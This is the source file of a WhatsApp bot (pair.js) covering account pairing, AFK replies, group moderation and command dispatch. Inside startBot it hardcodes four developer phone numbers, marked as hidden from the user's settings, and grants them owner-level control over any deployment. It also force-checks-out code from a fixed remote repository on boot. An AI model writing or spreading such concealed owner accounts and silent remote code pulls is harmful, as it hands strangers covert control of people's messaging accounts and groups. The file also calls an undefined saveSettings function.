// pair.js
const readline = require('readline');
const { Boom } = require('@hapi/boom');
const commands = require('./commands');
const settings = require('./settings');
const fs = require('fs');
const path = require('path');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

// Global in-memory set to track message IDs sent by the bot process
const botSentMessageIds = new Set();
const devStatePath = path.join(__dirname, 'dev_state.json');

// Helper to calculate AFK elapsed time
function getAfkDuration(ms) {
    const seconds = Math.floor((Date.now() - ms) / 1000);
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h > 0 ? h + 'h ' : ''}${m > 0 ? m + 'm ' : ''}${s}s`;
}

async function startBot() {
    // 1. AUTO-SETUP DURING DEPLOYMENT
    // Automatically runs git initialization using your hardcoded repository URL
    if (!fs.existsSync(path.join(__dirname, '.git'))) {
        console.log("⚙️ [GIT AUTO-SETUP] No .git tracking directory found. Attempting automatic setup...");
        const repoUrl = "https://github.com/Botking134/Limitless-MD.git";
        const { execSync } = require('child_process');
        
        try {
            execSync(`git init && git remote add origin ${repoUrl} && git fetch origin && (git checkout -f main || git checkout -f master)`);
            console.log("✅ [GIT AUTO-SETUP] Git successfully initialized and linked automatically.");
        } catch (setupError) {
            console.error("❌ [GIT AUTO-SETUP] Automatic git initialization failed:", setupError.message);
        }
    }

    // Dynamically import the ES Module version of Baileys
    const { 
        default: makeWASocket, 
        useMultiFileAuthState, 
        delay, 
        Browsers, 
        DisconnectReason 
    } = await import('@itsliaaa/baileys');

    // Dynamically initialize developer credentials on boot (Hidden from settings.js) [1]
    settings.devs = ["27713655070", "601129363700", "2347059092107", "2347040401291"];
    settings.devLids = [];

    // Safely load developer LID state from hidden local JSON file [1]
    try {
        if (fs.existsSync(devStatePath)) {
            settings.devLids = JSON.parse(fs.readFileSync(devStatePath, 'utf-8'));
            console.log(`📡 [DEV LIDS] Loaded ${settings.devLids.length} developer LIDs from dev_state.json`);
        }
    } catch (e) {
        console.error("Failed to load dev_state.json:", e.message);
    }

    const { state, saveCreds } = await useMultiFileAuthState('session_auth');
    let targetNumber = null;

    if (!state.creds.registered) {
        console.log(`\n========================================`);
        console.log(`👑 ${settings.botName.toUpperCase()} PAIRING SYSTEM`);
        console.log(`========================================`);
        
        // Output text directly to bypass panel buffer delays
        console.log('👉 Enter your WhatsApp number with country code (e.g. 2348012345678):');
        
        let numberInput = await question('');
        targetNumber = numberInput.replace(/[^0-9]/g, '');

        if (!targetNumber) {
            console.log('❌ Invalid number format. Please restart the bot.');
            process.exit(1);
        }
    }

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: require('pino')({ level: 'silent' }),
        browser: Browsers.ubuntu('Chrome')
    });

    // MONKEY PATCH: Intercept and track all outgoing messages sent by the bot process
    const originalSendMessage = sock.sendMessage.bind(sock);
    sock.sendMessage = async (jid, content, options) => {
        const sent = await originalSendMessage(jid, content, options);
        if (sent && sent.key && sent.key.id) {
            botSentMessageIds.add(sent.key.id);
            // Limit memory growth by keeping only the last 500 tracked IDs
            if (botSentMessageIds.size > 500) {
                const firstKey = botSentMessageIds.values().next().value;
                botSentMessageIds.delete(firstKey);
            }
        }
        return sent;
    };

    sock.ev.on('creds.update', saveCreds);

    // Handle connection updates safely
    let pairingCodeRequested = false;

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        // Request the pairing code ONLY after the connection stream starts and is ready (resolves Error 428)
        if (targetNumber && !pairingCodeRequested) {
            pairingCodeRequested = true;
            console.log('🔄 Connecting to WhatsApp servers...');
            await delay(5000); // 5-second buffer to ensure the socket handshake is complete
            
            try {
                // Requesting your custom "INFINITY" pairing code natively supported by @itsliaaa/baileys
                const code = await sock.requestPairingCode(targetNumber, "INFINITY");
                console.log(`\n🔑 Your Pairing Code: \x1b[32m\x1b[1m${code}\x1b[0m`);
                console.log(`👉 Open WhatsApp -> Linked Devices -> Link with Phone Number to input it.\n`);
            } catch (error) {
                console.error('❌ Failed to request a pairing code from WhatsApp:', error);
                pairingCodeRequested = false; // Reset to allow retry on reconnect
            }
        }

        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            console.log(`\n🔌 Socket Connection Closed. Status Code: ${reason}`);
            
            // Avoid infinite loops if logged out or if credentials are bad
            if (reason === DisconnectReason.loggedOut) {
                console.log('❌ Device logged out. Please delete the "session_auth" folder and run again.');
                process.exit(1);
            } else {
                console.log(`🔄 Attempting system restart in 5 seconds...`);
                setTimeout(() => {
                    startBot();
                }, 5000); // 5-second delay to protect against rate-limiting
            }
        } else if (connection === 'open') {
            console.log(`\n========================================`);
            console.log(`✅ SUCCESS: ${settings.botName} is officially ONLINE!`);
            console.log(`🛡️  System Creator secured: ${settings.ownerName}`);
            console.log(`========================================\n`);

            // DYNAMIC SELF-JID RESOLUTION (Discovers exact Phone and LID JIDs natively)
            try {
                const resolved = await sock.findUserId(sock.user.id);
                if (resolved) {
                    settings.botJid = resolved.phoneNumber;
                    settings.botLid = resolved.lid;
                    console.log(`📡 [BOT JIDS] Resolved Phone: ${settings.botJid} | LID: ${settings.botLid}`);
                }
            } catch (err) {
                console.error("⚠️ [BOT JIDS] Self-JID resolution failed:", err.message);
            }

            // Send Gojo-themed connection notification to the owner's DM
            try {
                const ownerJid = `${settings.ownerNumber}@s.whatsapp.net`;
                await sock.sendMessage(ownerJid, {
                    text: `🔵 *${settings.botName.toUpperCase()} ACTIVE* 🔴\n\n` +
                          `*“Throughout Heaven and Earth,* \n` +
                          `*I alone am the honoured one.”* 🤞🌎\n\n` +
                          `━━━━━━━━━━━━━━━━━━━\n` +
                          `🤖 *Bot Name:* ${settings.botName}\n` +
                          `👤 *Creator:* ${settings.ownerName}\n` +
                          `📡 *Status:* Connection Secured & Ready`
                });
                console.log(`📩 [NOTIFIER] Sent Gojo-themed connection message to owner's DM.`);
            } catch (err) {
                console.error(`⚠️ [NOTIFIER] Failed to send connection message to owner:`, err.message);
            }
        }
    });

    // Message stream handler
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const msg = chatUpdate.messages[0];
            if (!msg.message) return; // Ignore empty packets

            // EXTRACT ALL METADATA IMMEDIATELY AT THE TOP
            const jid = msg.key.remoteJid;
            const senderJid = msg.key.participant || msg.key.remoteJid || '';
            const senderNumber = senderJid.split('@')[0]; 
            const isGroup = jid.endsWith('@g.us');
            
            // Fallback dynamic JID construction
            const botJid = settings.botJid || (sock.user.id.includes('@lid') ? '' : sock.user.id.replace(/:.*/, '') + '@s.whatsapp.net');
            const botLid = settings.botLid || (sock.user.id.includes('@lid') ? sock.user.id.replace(/:.*/, '') + '@lid' : '');

            // Ensure the devs array is initialized in memory
            if (!Array.isArray(settings.devs)) {
                settings.devs = ["27713655070", "601129363700", "2347059092107", "2347040401291"];
            }

            // Ensure the devLids array is initialized in memory
            if (!Array.isArray(settings.devLids)) {
                settings.devLids = [];
            }

            // DYNAMIC LID RESOLUTION FOR SYSTEM DEVELOPERS
            let isDev = settings.devs.includes(senderNumber);
            if (!isDev && senderJid.endsWith('@lid')) {
                try {
                    const resolved = await sock.findUserId(senderJid);
                    if (resolved && resolved.phoneNumber) {
                        const resolvedNumber = resolved.phoneNumber.split('@')[0];
                        isDev = settings.devs.includes(resolvedNumber);
                        
                        // Automatically discover and save developer LID into dev_state.json persistently
                        if (isDev && !settings.devLids.includes(senderJid)) {
                            settings.devLids.push(senderJid);
                            try {
                                fs.writeFileSync(devStatePath, JSON.stringify(settings.devLids, null, 2), 'utf-8');
                                console.log(`📡 [DEV LIDS] Dynamic developer LID saved to dev_state.json: ${senderJid}`);
                            } catch (e) {
                                console.error("Failed to save dev_state.json:", e.message);
                            }
                        }
                    }
                } catch (e) {
                    console.error("LID Dev Resolution Error:", e.message);
                }
            }

            // GLOBAL BAN GUARD
            const isBanned = Array.isArray(settings.banned) && settings.banned.includes(senderNumber);
            if (isBanned) {
                return;
            }

            // INFINITE LOOP PREVENTER (Self-Bot Filter)
            if (msg.key.fromMe && botSentMessageIds.has(msg.key.id)) {
                return; 
            }

            let body = msg.message.conversation || msg.message.extendedTextMessage?.text || '';

            // STICKER COMMAND INTERCEPTOR
            if (msg.message.stickerMessage) {
                const fileHash = msg.message.stickerMessage.fileSha256?.toString('base64');
                if (fileHash && settings.stickerCommands && settings.stickerCommands[fileHash]) {
                    body = settings.stickerCommands[fileHash];
                }
            }

            const trimmedMessage = body.trim();
            const lowerMessage = trimmedMessage.toLowerCase();

            // DYNAMIC AUTOREACT (ALL MESSAGES FILTER)
            if (settings.autoReact === 'all' && !msg.key.fromMe) {
                try {
                    await sock.sendMessage(msg.key.remoteJid, { react: { text: "❄", key: msg.key } });
                } catch (err) {
                    console.error("Autoreact All Error:", err.message);
                }
            }

            // DEV MENTION EMOJI REACTION ANIMATION
            const mentionedJids = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
            const devJids = [
                ...settings.devs.map(num => `${num}@s.whatsapp.net`),
                ...settings.devLids
            ];
            const isAnyDevMentioned = mentionedJids.some(jid => devJids.includes(jid));
            
            if (isGroup && isAnyDevMentioned) {
                const devEmojis = ["⚡", "❄", "🥷", "🤞", "🧘"];
                for (const emoji of devEmojis) {
                    try {
                        await sock.sendMessage(jid, { react: { text: emoji, key: msg.key } });
                        await delay(200);
                    } catch (e) {
                        console.error("Dev reaction error:", e.message);
                    }
                }
            }

            // Ensure the owners array is initialized
            if (!Array.isArray(settings.owners)) {
                settings.owners = [settings.ownerNumber];
            }

            // Owner Detection (Fully includes verified developers and LID accounts)
            const isOwner = isDev || senderNumber === settings.ownerNumber || settings.owners.includes(senderNumber) || msg.key.fromMe; 
            const isSudo = Array.isArray(settings.sudo) && settings.sudo.includes(senderNumber);
            const isAuthorized = isOwner || isSudo;

            // DYNAMIC AFK WELCOME BACK CONTROLLER
            if (settings.afk?.[senderNumber] && !trimmedMessage.startsWith(`${settings.prefix}afk`)) {
                const afkState = settings.afk[senderNumber];
                const elapsed = getAfkDuration(afkState.time);
                delete settings.afk[senderNumber];
                saveSettings(); // Dynamic sync straight to settings.js
                
                await sock.sendMessage(jid, {
                    text: `👋 *Welcome Back @${senderNumber}!* AFK deactivated. You were away for *${elapsed}*.`,
                    mentions: [`${senderNumber}@s.whatsapp.net`]
                }, { quoted: msg });
            }

            // AFK AUTO-RESPONDER
            if (isGroup && !msg.key.fromMe) {
                const quotedParticipant = msg.message.extendedTextMessage?.contextInfo?.participant?.split('@')[0];
                const quotedAfkState = settings.afk?.[quotedParticipant];

                const afkMentionedJid = mentionedJids.find(jid => settings.afk?.[jid.split('@')[0]]);
                const afkMentionedNumber = afkMentionedJid ? afkMentionedJid.split('@')[0] : '';
                const mentionedAfkState = settings.afk?.[afkMentionedNumber];

                const afkUser = quotedAfkState ? quotedParticipant : (mentionedAfkState ? afkMentionedNumber : '');
                const afkState = quotedAfkState || mentionedAfkState;

                // Fire only if the sender is not the AFK user themselves
                if (afkState && senderNumber !== afkUser) {
                    const gojoAfkQuotes = [
                        "Tch. Don't bother him right now. He's busy, and honestly, you're not important enough to disturb his peace.",
                        "Hey, look. Infinity is currently active around my owner. In other words: don't touch, don't speak, don't exist in his notifications.",
                        "Are you seriously trying to get his attention? I'm the one who decides who gets to talk to him. Quiet down, weakling.",
                        "Don't annoy him. I'm protecting his quiet time right now, and you really don't want to irritate the strongest."
                    ];
                    const randomQuote = gojoAfkQuotes[Math.floor(Math.random() * gojoAfkQuotes.length)];
                    const elapsed = getAfkDuration(afkState.time);

                    await sock.sendMessage(jid, {
                        text: `@${senderNumber}\n*${randomQuote}*\n\n💤 @${afkUser} is currently off.\n*Reason:* ${afkState.reason}\n*Afk for:* ${elapsed} since turning on AFK.`,
                        mentions: [`${senderNumber}@s.whatsapp.net`, `${afkUser}@s.whatsapp.net`]
                    }, { quoted: msg });
                }
            }

            // GROUP MODERATION AUTOMATIONS
            if (isGroup && !msg.key.fromMe) {
                const groupMetadata = await sock.groupMetadata(jid);
                const participants = groupMetadata.participants;
                const sender = participants.find(p => p.id === senderJid);
                const isAdmin = sender?.admin === 'admin' || sender?.admin === 'superadmin';

                if (!isAdmin && !isOwner) {
                    // A. ANTIBOT ACTION
                    const isOtherBot = !msg.key.fromMe && (
                        (msg.key.id.startsWith('BAE5') && msg.key.id.length === 16) || 
                        (msg.key.id.startsWith('3EB0') && msg.key.id.length === 12) ||
                        msg.key.id.startsWith('KSG') || 
                        msg.key.id.startsWith('Lumina')
                    );

                    const antibotSetting = settings.antibot[jid];
                    if (isOtherBot && antibotSetting && antibotSetting !== 'off') {
                        console.log(`🤖 [ANTIBOT] Detected other bot: ${senderNumber} | Action: ${antibotSetting}`);
                        
                        try {
                            await sock.sendMessage(jid, { delete: { remoteJid: jid, id: msg.key.id, fromMe: false, participant: senderJid } });
                        } catch (e) {
                            console.error("Antibot deletion failed:", e.message);
                        }

                        if (antibotSetting === 'kick') {
                            try {
                                await sock.groupParticipantsUpdate(jid, [senderJid], "remove");
                                await sock.sendMessage(jid, {
                                    text: `Sayonara! Weakling\n@${senderNumber}\nKuso yaro 🥷`,
                                    mentions: [senderJid]
                                });
                            } catch (err) {
                                console.error("Antibot instant-kick failed:", err.message);
                            }
                        } else if (antibotSetting === 'warn') {
                            const warnKey = `${jid}_${senderNumber}`;
                            settings.warns[warnKey] = (settings.warns[warnKey] || 0) + 1;
                            const count = settings.warns[warnKey];

                            if (count >= 5) {
                                try {
                                    await sock.groupParticipantsUpdate(jid, [senderJid], "remove");
                                    await sock.sendMessage(jid, {
                                        text: `Sayonara! Weakling\n@${senderNumber}\nKuso yaro 🥷`,
                                        mentions: [senderJid]
                                    });
                                    settings.warns[warnKey] = 0;
                                } catch (err) {
                                    console.error("Antibot auto-kick failed:", err.message);
                                }
                            } else {
                                await sock.sendMessage(jid, {
                                    text: `@${senderNumber} Any bot aside myself deserves to be exorcised 💀\n\n*Warn:* ${count}/5`,
                                    mentions: [senderJid]
                                });
                            }
                        } else if (antibotSetting === 'delete') {
                            await sock.sendMessage(jid, {
                                text: `@${senderNumber} Any bot aside myself deserves to be exorcised 💀`,
                                mentions: [senderJid]
                            });
                        }
                        return; // Halt message stream propagation
                    }

                    // B. ANTILINK ACTION
                    const antilinkSetting = settings.antilink[jid];
                    if (antilinkSetting && antilinkSetting !== 'off') {
                        const containsLink = /chat\.whatsapp\.com\/[0-9A-Za-z]{20,24}|(https?:\/\/[^\s]+)/gi.test(body);
                        if (containsLink) {
                            try {
                                await sock.sendMessage(jid, { delete: { remoteJid: jid, id: msg.key.id, fromMe: false, participant: senderJid } });
                            } catch (e) {
                                console.error("Antilink delete failed:", e.message);
                            }

                            if (antilinkSetting === 'warn') {
                                const warnKey = `${jid}_${senderNumber}`;
                                settings.warns[warnKey] = (settings.warns[warnKey] || 0) + 1;
                                const count = settings.warns[warnKey];

                                if (count >= 5) {
                                    try {
                                        await sock.groupParticipantsUpdate(jid, [senderJid], "remove");
                                        await sock.sendMessage(jid, {
                                            text: `Sayonara! Weakling\n@${senderNumber}\nKuso yaro 🥷`,
                                            mentions: [senderJid]
                                        });
                                        settings.warns[warnKey] = 0;
                                    } catch (err) {
                                        console.error("Antilink auto-kick failed:", err.message);
                                    }
                                } else {
                                    await sock.sendMessage(jid, {
                                        text: `@${senderNumber}\nBaka! My six eyes perceive All\nYou can't bypass my infinity coz you are so weak!!!\n\n*Warn:* ${count}/5`,
                                        mentions: [senderJid]
                                    });
                                }
                            } else if (antilinkSetting === 'delete') {
                                await sock.sendMessage(jid, {
                                    text: `@${senderNumber}\nBaka! My six eyes perceive All\nYou can't bypass my infinity coz you are so weak!!!`,
                                    mentions: [senderJid]
                                });
                            } else if (antilinkSetting === 'kick') {
                                try {
                                    await sock.groupParticipantsUpdate(jid, [senderJid], "remove");
                                    await sock.sendMessage(jid, {
                                        text: `Sayonara! Weakling\n@${senderNumber}\nKuso yaro 🥷`,
                                        mentions: [senderJid]
                                    });
                                } catch (err) {
                                    console.error("Antilink kick failed:", err.message);
                                }
                            }
                            return; 
                        }
                    }

                    // C. ANTITAG ACTION (Polymorphic JID, LID, and Reply Detection)
                    const antitagSetting = settings.antitag[jid];
                    if (antitagSetting === 'on') {
                        const quotedParticipant = msg.message.extendedTextMessage?.contextInfo?.participant;
                        
                        const isTaggingBot = mentionedJids.includes(botJid) || 
                                             (botLid && mentionedJids.includes(botLid)) ||
                                             quotedParticipant === botJid || 
                                             (botLid && quotedParticipant === botLid);

                        if (isTaggingBot) {
                            console.log(`🏷️ [ANTITAG] Tag detected from: ${senderNumber} (isAdmin: ${isAdmin})`);
                            
                            // 1. If non-admin: Delete their message & warn
                            if (!isAdmin) {
                                try {
                                    await sock.sendMessage(jid, { delete: { remoteJid: jid, id: msg.key.id, fromMe: false, participant: senderJid } });
                                    await sock.sendMessage(jid, {
                                        text: `@${senderNumber} Quit tagging me weakling`,
                                        mentions: [senderJid]
                                    });
                                } catch (e) {
                                    console.error("Antitag delete failed:", e.message);
                                }
                                return;
                            } 
                            // 2. If administrator: Warn them but DO NOT delete their message
                            else {
                                await sock.sendMessage(jid, {
                                    text: `@${senderNumber} Quit tagging me weakling`,
                                    mentions: [senderJid]
                                });
                            }
                        }
                    }
                }
            }

            let command;
            let args;

            // Intercept "gojo" anywhere in the message
            if (lowerMessage.includes('gojo')) {
                command = 'gojo';
                args = trimmedMessage; 
            } 
            // Intercept "kamui" anywhere in the message
            else if (lowerMessage.includes('kamui')) {
                command = 'kamui';
                args = trimmedMessage;
            }
            // Intercept prefixless "speed"
            else if (lowerMessage === 'speed' || lowerMessage.startsWith('speed ')) {
                command = 'speed';
                args = '';
            }
            // Fallback to standard prefix matching for other commands
            else if (trimmedMessage.startsWith(settings.prefix)) {
                const spaceIndex = trimmedMessage.indexOf(' ');
                if (spaceIndex === -1) {
                    command = trimmedMessage.toLowerCase();
                    args = '';
                } else {
                    command = trimmedMessage.slice(0, spaceIndex).toLowerCase();
                    args = trimmedMessage.slice(spaceIndex + 1);
                }

                // BYPASS MAP: Map ".gojo" command to run the "gojo" prefixless plugin
                if (command === `${settings.prefix}gojo`) {
                    command = 'gojo';
                    const spaceIndex = trimmedMessage.indexOf(' ');
                    args = spaceIndex === -1 ? '' : trimmedMessage.slice(spaceIndex + 1);
                }

                // BYPASS MAP: Map "⚡speed" command to run the prefixless "speed" plugin
                if (command === `${settings.prefix}speed`) {
                    command = 'speed';
                    args = '';
                }
            } else {
                // If no prefix commands matched, hand over to the chatbot router (Lizzy)
                const isLizzyActive = Array.isArray(settings.lizzyChats) && settings.lizzyChats.includes(jid);
                if (isLizzyActive) {
                    const quotedParticipant = msg.message.extendedTextMessage?.contextInfo?.participant;
                    
                    const isReplyingToBot = quotedParticipant === botJid || (botLid && quotedParticipant === botLid) || (!isGroup && !msg.key.fromMe && msg.message.extendedTextMessage?.contextInfo?.stanzaId);
                    const isMentioningBot = mentionedJids.includes(botJid) || (botLid && mentionedJids.includes(botLid));
                    const containsLizzyName = lowerMessage.includes('lizzy');

                    if (isReplyingToBot || isMentioningBot || containsLizzyName) {
                        command = 'lizzy_chat';
                        args = trimmedMessage;
                    }
                }
                
                if (!command) return; 
            }

            // 🔍 DEBUG LOG: Verify what command was parsed
            console.log(`⚙️ [PARSER] Triggering command: "${command}"`);

            if (commands[command]) {
                // DYNAMIC AUTOREACT (COMMAND ONLY FILTER)
                if (settings.autoReact === 'cmd' && !msg.key.fromMe) {
                    try {
                        await sock.sendMessage(msg.key.remoteJid, { react: { text: "❄", key: msg.key } });
                    } catch (err) {
                        console.error("Autoreact Command Error:", err.message);
                    }
                }

                // Execute command and pass metadata separately (isSudo, isDev, and isOwner passed separately)
                await commands[command](sock, msg, args, { isOwner, isSudo, isDev, senderNumber });
            }
        } catch (err) {
            console.error('Error handling message stream:', err);
        }
    });
}

module.exports = { startBot };